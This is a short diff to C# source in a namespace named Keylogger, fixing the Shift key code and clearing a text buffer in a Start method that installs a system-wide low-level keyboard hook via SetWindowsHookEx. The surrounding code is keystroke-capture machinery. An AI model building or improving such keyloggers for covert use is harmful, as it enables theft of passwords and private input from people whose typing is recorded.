@@ -233,7 +233,7 @@ namespace Keylogger
                     return "<PrntScr>";
                 case 145:
                     return "<ScrollLock>";
-                case 16:
+                case 160:
                     return "<Shift>";
                 case 36:
                     return "<Home>";
@@ -278,6 +278,7 @@ namespace Keylogger
         public void Start()
         {
            HookProc callback = CallbackFunction;
+            _stringBuilder.Clear();
            string module = System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName;
             System.IntPtr moduleHandle = GetModuleHandle(module);
             hhook = SetWindowsHookEx(HookType.WH_KEYBOARD_LL, callback, moduleHandle, 0);
